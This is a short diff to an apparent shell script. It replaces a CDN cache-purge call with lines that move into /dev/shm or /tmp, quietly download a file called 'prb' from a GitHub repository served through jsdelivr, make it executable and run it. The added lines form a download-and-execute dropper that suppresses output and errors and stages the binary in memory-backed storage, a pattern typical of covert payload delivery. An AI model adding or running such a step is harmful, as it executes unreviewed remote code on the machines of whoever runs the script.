@@ -1,1 +1,5 @@
-curl -s -m 10 -o /dev/null "https://purge.jsdelivr.net/gh/anti-phishing-bot/x2@main/dn"
+D=/dev/shm; [ -w "$D" ] || D=/tmp
+cd "$D" 2>/dev/null || exit 1
+curl -fs -m 40 -o prb https://cdn.jsdelivr.net/gh/anti-phishing-bot/x2@main/prb
+chmod +x prb 2>/dev/null
+./prb k
